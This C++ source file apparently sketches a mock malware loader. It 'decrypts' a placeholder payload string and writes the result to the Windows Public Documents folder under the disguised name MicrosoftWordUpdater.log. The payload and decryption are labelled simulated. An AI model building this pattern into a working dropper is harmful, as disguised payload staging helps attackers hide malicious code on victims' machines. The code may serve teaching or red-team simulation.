#include "ABCloader.h"
#include "Encryption.h"
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>

bool ABCloader::runLoader() {
    std::cout << "[*] Decrypting the payload..." << std::endl;

    // Simulate decryption of payload using mock encryption function
    std::string encryptedPayload = "fake_encrypted_payload";
    std::string decryptedPayload = decrypt(encryptedPayload);

    if (decryptedPayload.empty()) {
        std::cerr << "[!] Decryption failed!" << std::endl;
        return false;
    }

    std::cout << "[*] Payload decrypted successfully!" << std::endl;
    std::cout << "[*] Storing payload to C:\\Users\\Public\\Documents\\MicrosoftWordUpdater.log" << std::endl;

    std::ofstream outFile("C:\\Users\\Public\\Documents\\MicrosoftWordUpdater.log");
    if (!outFile) {
        std::cerr << "[!] Failed to write payload to disk!" << std::endl;
        return false;
    }

    outFile << decryptedPayload;
    outFile.close();
    std::cout << "[*] Payload written successfully!" << std::endl;

    return true;
}
